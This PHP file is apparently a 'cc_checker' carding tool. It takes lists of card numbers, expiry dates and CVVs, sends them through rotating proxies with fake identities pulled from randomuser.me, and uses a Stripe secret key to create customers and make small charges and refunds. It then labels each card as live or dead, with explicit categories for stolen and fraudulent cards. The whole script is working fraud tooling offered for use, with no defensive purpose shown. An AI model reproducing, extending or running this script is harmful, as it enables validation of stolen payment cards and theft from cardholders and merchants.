<?php


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
 $sk = $_GET['sec'];
$lista = $_GET['lista'];
 $cc = multiexplode(array(":", "|", ""), $lista)[0];
 $mes = multiexplode(array(":", "|", ""), $lista)[1];
  $ano = multiexplode(array(":", "|", ""), $lista)[2];
 $cvv = multiexplode(array(":", "|", " "), $lista)[3];
function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

///Proxy Function
function rebootproxys()
  {
    $poxySocks = file("proxy.txt");
    $myproxy = rand(0, sizeof($poxySocks) - 1);
    $poxySocks = $poxySocks[$myproxy];
    return $poxySocks;
  }
  $poxySocks4 = rebootproxys();

///proxy zone function

$username = 'Put Zone Username Here';
$password = 'Put Zone Password Here';
//$port = add port and uncomment ;
$session = mt_rand();
$super_proxy = 'zone url here';



////////////////////////////===[Random User ]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];



//[Auth Section]
  $ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);

  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=carolprogay&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
   $result1 = curl_exec($ch);
  $s = json_decode($result1, true);
  
  $token = $s['id'];




$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$name.' '.$last.'&source='.$token.'');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
   $result2 = curl_exec($ch);
  $cus = json_decode($result2, true);
$token3 = $cus['id'];

   // echo $token1 = $cus['id'];
   //  echo $token1 = $cus['id'];
 $message = trim(strip_tags(getStr($result2,'"message": "','"')));

 $cvvcheck = trim(strip_tags(getStr($result2,'"cvc_check": "','"')));

 $declinecode = trim(strip_tags(getStr($result2,'"code": "','"')));

echo "<span>  cvv_check = ".$cvvcheck."</span>";


//[Charge Section]
 curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);

  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=50&currency=usd&customer='.$token3.'');
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  $result3 = curl_exec($ch);

   $char = json_decode($result3, true);
 $chtoken = trim(strip_tags(getStr($result3,'"charge": "','"')));
   $chargetoken = $char['charge'];
$decline3 = trim(strip_tags(getStr($result3,'"decline_code": "','"')));

  $ch = curl_init();
   curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);

  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$chtoken.'&amount=50&reason=requested_by_customer');
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
 $result4 = curl_exec($ch);

//////////////////////////////
$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

/////////////////////////// [Card Response]  //////////////////////////

if(strpos($result3, '"seller_message": "Payment complete."' )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) @cc_checker charge + refund 」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"cvc_check": "pass"')){
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) CHARGED BC 」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}


elseif(strpos($result1, "generic_decline")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Generic_Decline @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, "generic_decline" )) {
    echo '<span class="badge badge-success">#DEAD</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DECLINE GENERIC 3 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "insufficient_funds" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV - INSUFFICIENT FUND3  @cc_checker)」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result3, "fraudulent" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved fraudulent @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo '<span class="badge badge-success">#DEAD</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DECLINE DO NOT HONOR 3 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo '<span class="badge badge-success">#DEAD</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DECLINE DO NOT HONOR 3 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Fraudulent Card @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo '<span class="badge badge-info">#Approved</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CCN 2 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo '<span class="badge badge-info">#Approved</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CCN 2 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"invalid_account")){
    echo '<span class="badge badge-danger">#DECLINE</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-danger"> 「invalid_account @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo '<span class="badge badge-danger">#DECLINE</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DO NOT HONOR 2 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> GAY「Lost Card @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "lost_card" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Lost Card @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Stolen Card @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }

elseif(strpos($result3, "stolen_card" )) {
    echo '<span class="badge badge-success">#decline</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Stolen Card @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';


}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined (transaction_not_allowed) @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CCN3) @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '<span class="badge badge-danger">#decline</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost) @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "pickup_card" )) {
    echo '<span class="badge badge-danger">#decline</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost) @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">#Decline</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Expired Card @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">#decline</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Expired Card @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result3, '"code": "processing_error"')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「PROCESSING ERROR @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, ' "message": "Your card number is incorrect."')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Your card number is incorrect @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, '"decline_code": "service_not_allowed"')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「service_not_allowed @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> gay「PROCESSING ERROR @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Your card number is incorrect @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「service_not_allowed @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Incorrect Card Number @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Do_Not_Honor @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Declined @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Do_Not_Honor @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Generic_Decline @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Declined @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result3,' "decline_code": "do_not_honor"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Check : Do_Not_Honor 3 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Proxy Error @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Fail @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Check : Unavailable @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"cvc_check": "unchecked"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Proxy Error @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Fail @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Doesnt Support Purchase @cc_checker」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) @cc_checker AUTH ONLY  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result3, "fraudulent" )) {
    echo '<span class="badge badge-success">#Declined</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved fraudulent @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
else {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Dead Proxy/Error Not listed @cc_checker」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
      echo $result1;
       echo $result2;
   

      
}

  curl_close($curl);
  ob_flush();
  

?>
